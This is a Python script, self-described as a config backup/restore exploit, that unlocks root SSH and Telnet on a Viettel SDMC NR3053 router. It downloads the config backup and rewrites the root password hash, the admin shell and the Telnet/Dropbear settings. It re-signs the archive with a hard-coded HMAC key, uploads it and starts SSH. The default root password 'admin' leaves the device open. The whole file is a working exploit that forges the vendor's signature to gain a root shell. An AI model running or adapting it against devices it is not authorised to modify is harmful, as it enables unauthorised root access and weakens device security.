#!/usr/bin/env python3
"""
NR3053 Unlock v2 - Config Backup/Restore Exploit
=================================================
Unlock SSH/Telnet trên Viettel SDMC NR3053 bằng phương pháp
sửa đổi config backup và upload lại.

Cách dùng:
    python3 unlock_nr3053_v2.py --password SERIAL_NUMBER
    python3 unlock_nr3053_v2.py --password SDMC25B12308007286

Yêu cầu:
    pip3 install requests
"""

import base64
import hashlib
import hmac
import gzip
import tarfile
import io
import json
import sys
import time
import socket
import argparse
import subprocess

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    print("ERROR: pip3 install requests")
    sys.exit(1)


HMAC_KEY = b"http://192.168.1.1"
NEW_ROOT_PASSWORD = "admin"

# Header giống trình duyệt — một số bản CGI chỉ trả config.bin khi có Referer/User-Agent.
_BROWSER_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    ),
}

# MD5-crypt ($1$) hash for /etc/shadow — bí danh với firmware (libcrypt).
# Python 3.13+ đã xóa stdlib `crypt`; thử: stdlib → PyPI crypt-r → openssl(1).


def make_md5_crypt(password: str) -> str:
    salt = "$1$rootsalt"
    try:
        import crypt as _crypt_mod  # type: ignore[import-not-found]

        return _crypt_mod.crypt(password, salt)
    except ModuleNotFoundError:
        pass
    try:
        import crypt_r as _crypt_mod

        return _crypt_mod.crypt(password, salt)
    except ImportError:
        pass
    try:
        cp = subprocess.run(
            ["openssl", "passwd", "-1", "-salt", "rootsalt", password],
            capture_output=True,
            text=True,
            check=True,
        )
        out = cp.stdout.strip()
        if out:
            return out
    except (FileNotFoundError, subprocess.CalledProcessError):
        pass
    print(
        "ERROR: Không tạo được hash MD5-crypt cho mật khẩu root.\n"
        "  Python 3.13+ không có module `crypt`. Cài một trong các cách sau:\n"
        "    pip install crypt-r\n"
        "  hoặc (Debian/Ubuntu): sudo apt install openssl  (đã có sẵn thường dùng openssl passwd)",
        file=sys.stderr,
    )
    sys.exit(1)


def check_port(host, port, timeout=3):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        s.close()
        return True
    except Exception:
        return False


def api_call(base_url, method, params=None, token="", extra_headers=None):
    payload = {
        "jsonrpc": "2.0",
        "method": method,
        "params": params if params else [],
        "id": 0,
    }
    hdr = dict(_BROWSER_HEADERS)
    if extra_headers:
        hdr.update(extra_headers)
    url = f"{base_url}?token={token}"
    r = requests.post(url, json=payload, timeout=30, verify=False, headers=hdr)
    try:
        return r.json()
    except ValueError:
        return {
            "error": {
                "code": "BAD_JSON",
                "message": f"HTTP {r.status_code}: {r.text[:400]}",
            },
        }


def login(base_url, username, password):
    return api_call(base_url, "MGMT.login", [
        {"loginUserName": username, "loginPwd": password}
    ])


def _looks_like_config_bin(body: bytes) -> bool:
    """config.bin = 32 byte HMAC + gzip (magic 1f 8b)."""
    if len(body) < 64:
        return False
    return body[32:34] == b"\x1f\x8b"


def _maybe_decode_config_from_rpc(resp) -> bytes | None:
    """Một firmware trả backup dạng base64 trong JSON-RPC result."""
    if not isinstance(resp, dict) or resp.get("error"):
        return None
    result = resp.get("result")
    candidates: list[str] = []

    def collect(obj, depth=0):
        if depth > 6:
            return
        if isinstance(obj, str) and len(obj) > 80:
            candidates.append(obj)
        elif isinstance(obj, dict):
            for v in obj.values():
                collect(v, depth + 1)
        elif isinstance(obj, list):
            for v in obj:
                collect(v, depth + 1)

    collect(result)
    for s in candidates:
        try:
            raw = base64.b64decode(s, validate=False)
            if _looks_like_config_bin(raw):
                return raw
        except Exception:
            continue
        try:
            pad = "=" * (-len(s) % 4)
            raw = base64.b64decode(s + pad)
            if _looks_like_config_bin(raw):
                return raw
        except Exception:
            continue
    return None


def _download_via_post_router_methods(
    jsonrpc_urls: list[str],
    token: str,
    verbose: bool,
) -> tuple[bytes | None, str | None]:
    """Thử JSON-RPC có trả backup (base64) trong result (router.cgi và/hoặc config.cgi)."""
    methods = [
        "MGMT.exportConfig",
        "MGMT.exportSettings",
        "MGMT.backupConfig",
        "MGMT.getBackup",
        "MGMT.getConfigBackup",
        "SYS.backupConfig",
        "SYS.exportConfig",
    ]
    for rpc_url in jsonrpc_urls:
        for m in methods:
            try:
                resp = api_call(rpc_url, m, [], token)
                if verbose:
                    print(f"    POST {rpc_url.split(':')[0]} …/{rpc_url.split('/')[-1]} {m}: {str(resp)[:220]}")
                raw = _maybe_decode_config_from_rpc(resp)
                if raw:
                    print(f"  Đã lấy config.bin qua JSON-RPC {m} ({len(raw)} bytes)")
                    if "config.cgi" in rpc_url:
                        cfg = rpc_url
                    else:
                        cfg = rpc_url.replace("router.cgi", "config.cgi")
                    return raw, cfg
            except Exception as e:
                if verbose:
                    print(f"    POST {m} error: {e}")
    return None, None


def download_config(ip: str, token: str, verbose: bool = False):
    """
    Gọi MGMT.saveConfig rồi GET config.cgi.
    Thử HTTPS trước, sau đó HTTP; thêm User-Agent + Referer cho GET.
    """
    schemes = ["https", "http"]
    router_bases = [f"{s}://{ip}/cgi-bin/router.cgi" for s in schemes]
    config_urls = [f"{s}://{ip}/cgi-bin/config.cgi" for s in schemes]
    # Thêm tham số GET — một số build chỉ trả file khi có download= / operation=
    query_extras = (
        "",
        "download=1",
        "download=true",
        "operation=download",
        "operation=backup",
        "action=backup",
        "type=backup",
    )

    save_resp = None
    for rb in router_bases:
        save_resp = api_call(rb, "MGMT.saveConfig", token=token)
        if verbose:
            print(f"  saveConfig ({rb.split(':')[0]}): {save_resp}")
        err = (
            save_resp.get("error")
            if isinstance(save_resp, dict)
            else None
        )
        if err:
            msg = err.get("message") or err.get("code") or err
            print(f"  [!] saveConfig báo lỗi ({rb[:20]}…): {msg}")
        else:
            break

    # Đợi file được tạo trên router (một số máy chậm hơn 3s).
    time.sleep(6)

    last_hint = ""
    for attempt in range(14):
        for config_cgi in config_urls:
            for qx in query_extras:
                ref = config_cgi.replace("/cgi-bin/config.cgi", "/")
                hdr = dict(_BROWSER_HEADERS)
                hdr["Referer"] = ref
                qurl = f"{config_cgi}?token={token}"
                if qx:
                    qurl += f"&{qx}"
                try:
                    r = requests.get(
                        qurl,
                        timeout=45,
                        verify=False,
                        headers=hdr,
                        allow_redirects=True,
                    )
                except requests.RequestException as e:
                    last_hint = f"{qurl}: {e}"
                    if verbose:
                        print(f"    GET lỗi: {last_hint}")
                    continue

                body = r.content
                ct = r.headers.get("Content-Type", "")
                text_snip = body[:400].decode("utf-8", errors="replace")

                strip = body.lstrip()
                if strip.startswith(b"{") or strip.startswith(b"["):
                    last_hint = (
                        f"{qurl} HTTP {r.status_code} "
                        f"Content-Type={ct!r} JSON≈{text_snip[:320]}"
                    )
                    if verbose:
                        print(f"    [lần {attempt + 1}] {last_hint}")
                    continue

                if len(body) <= 100:
                    last_hint = (
                        f"{qurl} HTTP {r.status_code} len={len(body)} "
                        f"body={body!r}"
                    )
                    continue

                if _looks_like_config_bin(body):
                    print(f"  Đã tải config.bin ({len(body)} bytes) qua {config_cgi.split(':')[0]}")
                    return body, config_cgi

                last_hint = (
                    f"{qurl} len={len(body)} head32hex={body[:32].hex()} "
                    f"gzip_at_32={body[32:34].hex() if len(body) > 34 else 'n/a'}"
                )
                if verbose:
                    print(f"    [lần {attempt + 1}] không phải gzip@32: {last_hint}")

        time.sleep(2)

    jsonrpc_urls = list(dict.fromkeys(router_bases + config_urls))
    raw, cfg = _download_via_post_router_methods(jsonrpc_urls, token, verbose)
    if raw:
        return raw, cfg

    print("  Chi tiết lần thử cuối (để báo lỗi / gỡ rối):")
    print(f"    {last_hint}")
    print(
        "  — GET config.cgi chỉ trả JSON (không còn stream file .bin) là hành vi một số bản firmware.\n"
        "  — Thử: trong web vào phần Sao lưu / Backup → tải config.bin về máy, rồi chạy script với:\n"
        "       --config-input /đường/dẫn/config.bin\n"
        "  — Nếu router đã unlock (SSH/Telnet đã mở): không cần exploit config nữa — đổi mật khẩu root bằng lệnh passwd qua SSH."
    )
    return None, None


def modify_config(config_bin, new_root_pw):
    orig_gzip = config_bin[32:]
    tar_bytes = gzip.decompress(orig_gzip)
    orig_tar = tarfile.open(fileobj=io.BytesIO(tar_bytes))

    new_root_hash = make_md5_crypt(new_root_pw)

    new_tar_buf = io.BytesIO()
    new_tar = tarfile.open(fileobj=new_tar_buf, mode="w")

    for member in orig_tar.getmembers():
        if not member.isfile():
            new_tar.addfile(member)
            continue

        data = orig_tar.extractfile(member).read()

        if member.name == "etc/shadow":
            lines = data.decode().split("\n")
            new_lines = []
            for line in lines:
                if line.startswith("root:"):
                    parts = line.split(":")
                    parts[1] = new_root_hash
                    new_lines.append(":".join(parts))
                else:
                    new_lines.append(line)
            data = "\n".join(new_lines).encode()

        elif member.name == "etc/passwd":
            text = data.decode()
            text = text.replace(
                "admin:x:301:301:admin:/var:/bin/false",
                "admin:x:301:301:admin:/var:/bin/ash",
            )
            data = text.encode()

        elif member.name == "etc/config/console":
            data = b"config console\n\toption enable '1'\n"

        elif member.name == "etc/config/telnet":
            data = b"config telnet\n\toption enable '1'\n"

        elif member.name == "etc/config/dropbear":
            data = (
                b"config dropbear\n"
                b"\toption PasswordAuth 'on'\n"
                b"\toption RootPasswordAuth 'on'\n"
                b"\toption Port '22'\n"
                b"\toption Enable '1'\n"
            )

        elif member.name == "etc/config/users":
            text = data.decode()
            text = text.replace("option enabled '0'", "option enabled '1'")
            data = text.encode()

        new_info = tarfile.TarInfo(name=member.name)
        new_info.size = len(data)
        new_info.mode = member.mode
        new_info.uid = member.uid
        new_info.gid = member.gid
        new_info.mtime = member.mtime
        new_info.type = member.type
        new_tar.addfile(new_info, io.BytesIO(data))

    new_tar.close()

    gzip_buf = io.BytesIO()
    with gzip.GzipFile(fileobj=gzip_buf, mode="wb", mtime=0) as gz:
        gz.write(new_tar_buf.getvalue())
    new_gzip = gzip_buf.getvalue()

    md5_hex = hashlib.md5(new_gzip).hexdigest()
    new_hmac = hmac.new(HMAC_KEY, md5_hex.encode(), hashlib.sha256).digest()

    return new_hmac + new_gzip


def upload_config(config_cgi, token, config_data):
    files = {
        "configFile": ("config.bin", io.BytesIO(config_data), "application/octet-stream")
    }
    r = requests.post(
        f"{config_cgi}?token={token}",
        files=files, timeout=60, verify=False,
    )
    return r.status_code, r.text


def wait_for_config_done(base_url, token):
    for i in range(20):
        time.sleep(3)
        try:
            r = api_call(base_url, "MGMT.getConfigUpgradeResult", token=token)
            status = r.get("result", {}).get("status", "?")
            print(f"    [{i*3}s] Status: {status}")
            if status == "done":
                return True
            if status == "error":
                return False
        except Exception:
            pass
    return False


def _telnet_strip_iac(data: bytes) -> bytes:
    """Bỏ các gói đàm phán Telnet IAC FF xx yy trong buffer (best-effort)."""
    out = bytearray()
    i = 0
    while i < len(data):
        if data[i] == 255 and i + 2 < len(data):
            i += 3
            continue
        out.append(data[i])
        i += 1
    return bytes(out)


def setup_ssh_via_telnet(ip, username, password):
    """Python 3.13+ đã xóa telnetlib — dùng socket thuần."""
    try:
        import telnetlib as _telnetlib  # type: ignore[import-not-found]

        try:
            tn = _telnetlib.Telnet(ip, 23, timeout=10)
            tn.read_until(b"login:", timeout=10)
            tn.write(username.encode() + b"\n")
            tn.read_until(b"assword:", timeout=10)
            tn.write(password.encode() + b"\n")
            time.sleep(2)

            output = tn.read_very_eager()
            text = output.decode("ascii", errors="replace")
            if "incorrect" in text.lower():
                print("  [!] Telnet login failed")
                tn.close()
                return False

            def cmd(c, wait=2):
                tn.write(c.encode() + b"\n")
                time.sleep(wait)
                try:
                    return tn.read_very_eager().decode("ascii", errors="replace")
                except Exception:
                    return ""

            cmd("rm -f /etc/dropbear/dropbear_rsa_host_key", 1)
            print("  [+] Generating RSA host key...")
            result = cmd(
                "dropbearkey -t rsa -s 2048 -f /etc/dropbear/dropbear_rsa_host_key",
                10,
            )
            if "Public key" in result:
                print("  [+] RSA key generated")
            else:
                print(f"  [!] Key generation output: {result[:200]}")

            cmd("dropbear -p 22", 3)
            netstat = cmd("netstat -tlnp 2>/dev/null | grep :22", 2)
            tn.close()
            if ":22" in netstat:
                print("  [+] Dropbear (SSH) started on port 22")
                return True
            print("  [!] Dropbear may not have started")
            return False
        except Exception as e:
            print(f"  [!] telnetlib failed: {e}, thử socket...")
    except ImportError:
        pass

    return _setup_ssh_via_socket(ip, username, password)


def _setup_ssh_via_socket(ip: str, username: str, password: str) -> bool:
    buf = bytearray()
    deadline = time.time() + 45

    def recv_more():
        sock.settimeout(1.0)
        try:
            chunk = sock.recv(8192)
            if chunk:
                buf.extend(_telnet_strip_iac(chunk))
        except (socket.timeout, OSError, BlockingIOError):
            pass

    def wait_for(sub: bytes) -> bool:
        while time.time() < deadline:
            if sub in buf:
                return True
            recv_more()
            time.sleep(0.05)
        return False

    def wait_shell():
        # BusyBox ash: root@OpenWrt:~#
        markers = (b"# ", b"#\r\n")
        while time.time() < deadline:
            recv_more()
            raw = bytes(buf)
            if any(m in raw for m in markers):
                return True
            time.sleep(0.05)
        return False

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(15)
        sock.connect((ip, 23))

        if not wait_for(b"login:"):
            print("  [!] Không thấy prompt login: qua Telnet")
            sock.close()
            return False
        sock.sendall(username.encode("ascii", errors="replace") + b"\r\n")
        buf.clear()

        if not wait_for(b"assword:"):
            print("  [!] Không thấy prompt Password:")
            sock.close()
            return False
        sock.sendall(password.encode("ascii", errors="replace") + b"\r\n")
        buf.clear()
        time.sleep(1.5)
        recv_more()

        text = buf.decode("ascii", errors="replace")
        if "incorrect" in text.lower() or "Login incorrect" in text:
            print("  [!] Telnet login failed (sai mật khẩu?)")
            sock.close()
            return False

        if not wait_shell():
            print("  [!] Không vào được shell sau login Telnet")
            sock.close()
            return False

        def run_cmd(line: str, pause: float = 2.0):
            sock.sendall(line.encode("ascii", errors="replace") + b"\r\n")
            time.sleep(pause)
            gather_deadline = time.time() + 25
            while time.time() < gather_deadline:
                recv_more()
                if b"# " in buf or b"#\r\n" in buf:
                    break
                time.sleep(0.05)
            out = buf.decode("ascii", errors="replace")
            buf.clear()
            return out

        run_cmd("rm -f /etc/dropbear/dropbear_rsa_host_key", 0.8)
        print("  [+] Generating RSA host key (socket)...")
        out = run_cmd(
            "dropbearkey -t rsa -s 2048 -f /etc/dropbear/dropbear_rsa_host_key",
            10,
        )
        if "Public key" in out or "Fingerprint" in out:
            print("  [+] RSA key generated")
        else:
            print(f"  [!] dropbearkey output: {out[-400:]}")

        run_cmd("dropbear -p 22", 3)
        chk = run_cmd("netstat -tlnp 2>/dev/null | grep :22 || ss -tlnp 2>/dev/null | grep :22", 2)
        sock.sendall(b"exit\r\n")
        sock.close()
        if ":22" in chk or "dropbear" in chk.lower():
            print("  [+] Dropbear (SSH) đang lắng nghe cổng 22")
            return True
        print("  [!] Chưa chắc dropbear đã mở — thử: telnet vào và chạy dropbear -p 22")
        return False
    except Exception as e:
        print(f"  [!] Telnet socket error: {e}")
        try:
            sock.close()
        except Exception:
            pass
        return False


def main():
    parser = argparse.ArgumentParser(
        description="Unlock SSH/Telnet on Viettel SDMC NR3053",
    )
    parser.add_argument("--ip", default="192.168.1.1")
    parser.add_argument("--password", "-p", required=True,
                        help="Web admin password (usually the device Serial Number)")
    parser.add_argument("--root-password", default=NEW_ROOT_PASSWORD,
                        help=f"New root password to set (default: {NEW_ROOT_PASSWORD})")
    parser.add_argument(
        "--verbose", "-v",
        action="store_true",
        help="In chi tiết khi tải config (GET/saveConfig).",
    )
    parser.add_argument(
        "--config-input", "-i", metavar="FILE",
        help=(
            "Đường dẫn file config.bin đã tải tay từ web (Sao lưu); "
            "bỏ qua bước [3] qua HTTP."
        ),
    )
    args = parser.parse_args()

    ip = args.ip
    default_https_router = f"https://{ip}/cgi-bin/router.cgi"
    default_https_config = f"https://{ip}/cgi-bin/config.cgi"

    print("=" * 60)
    print("  Viettel SDMC NR3053 — Unlock SSH/Telnet")
    print("  Config Backup/Restore Exploit")
    print("=" * 60)

    # --- Step 1: Check connectivity ---
    print("\n[1/7] Checking connectivity...")
    if not check_port(ip, 443) and not check_port(ip, 80):
        print(f"  Cannot reach {ip}. Is the router connected?")
        sys.exit(1)
    for port, name in [(80, "HTTP"), (443, "HTTPS"), (22, "SSH"), (23, "Telnet")]:
        s = "OPEN" if check_port(ip, port) else "closed"
        print(f"  Port {port:5d} ({name}): {s}")

    # --- Step 2: Login ---
    print(f"\n[2/7] Logging in as admin...")
    result = login(default_https_router, "admin", args.password)
    if "result" not in result or "token" not in result.get("result", {}):
        print(f"  Login FAILED: {result}")
        print("  Check your password. After factory reset, password = Serial Number.")
        sys.exit(1)
    token = result["result"]["token"]
    print(f"  Logged in! Level: {result['result'].get('level')}")

    # --- Step 3: Download config ---
    if args.config_input:
        print(f"\n[3/7] Đọc config backup từ file...")
        try:
            with open(args.config_input, "rb") as inf:
                config_bin = inf.read()
        except OSError as e:
            print(f"  Không đọc được file: {e}")
            sys.exit(1)
        if len(config_bin) < 64:
            print("  File quá nhỏ — không phải config.bin hợp lệ.")
            sys.exit(1)
        if not _looks_like_config_bin(config_bin):
            print(
                "  Cảnh báo: file không có gzip (magic 1f8b) tại offset 32 — "
                "có thể sai định dạng; bước sửa config có thể lỗi."
            )
        config_cgi_url = None
        print(f"  Đã đọc {len(config_bin)} bytes từ {args.config_input!r}")
    else:
        print(f"\n[3/7] Downloading config backup...")
        config_bin, config_cgi_url = download_config(ip, token, verbose=args.verbose)

    base_url = (
        config_cgi_url.replace("config.cgi", "router.cgi")
        if config_cgi_url
        else default_https_router
    )
    config_cgi = config_cgi_url or default_https_config

    if not config_bin:
        print("  Failed to download config. Try again hoặc dùng --config-input.")
        sys.exit(1)
    if not args.config_input:
        print(f"  Downloaded {len(config_bin)} bytes")

    # --- Step 4: Modify config ---
    print(f"\n[4/7] Modifying config (enable SSH/Telnet, set root password)...")
    new_config = modify_config(config_bin, args.root_password)
    print(f"  New config: {len(new_config)} bytes")

    # --- Step 5: Upload config ---
    print(f"\n[5/7] Uploading modified config...")
    status, resp = upload_config(config_cgi, token, new_config)
    print(f"  Upload HTTP {status}")

    print("  Waiting for config to apply...")
    if not wait_for_config_done(base_url, token):
        print("  Config apply may have failed. Check router status.")
        sys.exit(1)

    # --- Step 6: Reboot ---
    print(f"\n[6/7] Rebooting router...")
    try:
        api_call(base_url, "MGMT.reboot", token=token)
    except Exception:
        pass
    print("  Reboot command sent. Waiting 90 seconds...")

    for i in range(90, 0, -1):
        print(f"\r  Waiting... {i:3d}s ", end="", flush=True)
        time.sleep(1)
    print()

    for attempt in range(10):
        if check_port(ip, 80) or check_port(ip, 443):
            print("  Router is back online!")
            break
        print(f"  Still booting... (attempt {attempt+1})")
        time.sleep(10)

    # --- Step 7: Setup SSH via Telnet ---
    print(f"\n[7/7] Setting up SSH via Telnet...")
    time.sleep(5)
    if check_port(ip, 23):
        print("  Telnet port open, configuring SSH...")
        setup_ssh_via_telnet(ip, "root", args.root_password)
    else:
        print("  Telnet not open yet. You may need to generate SSH keys manually.")

    # --- Final status ---
    print("\n" + "=" * 60)
    telnet_ok = check_port(ip, 23)
    ssh_ok = check_port(ip, 22)

    if ssh_ok or telnet_ok:
        print("  UNLOCK THANH CONG!")
        print("=" * 60)
        print(f"\n  Root password: {args.root_password}")
        if ssh_ok:
            print(f"\n  SSH:")
            print(f"    ssh root@{ip}")
            print(f"    Password: {args.root_password}")
        if telnet_ok:
            print(f"\n  Telnet:")
            print(f"    telnet {ip}")
            print(f"    Login: root / {args.root_password}")

        if not ssh_ok and telnet_ok:
            print(f"\n  SSH chua mo? Dang nhap Telnet va chay:")
            print(f"    rm -f /etc/dropbear/dropbear_rsa_host_key")
            print(f"    dropbearkey -t rsa -s 2048 -f /etc/dropbear/dropbear_rsa_host_key")
            print(f"    dropbear -p 22")
    else:
        print("  Ports are still closed. Router may still be booting.")
        print("  Wait a few minutes and try:")
        print(f"    telnet {ip}")
        print(f"    ssh root@{ip}")
    print()


if __name__ == "__main__":
    main()
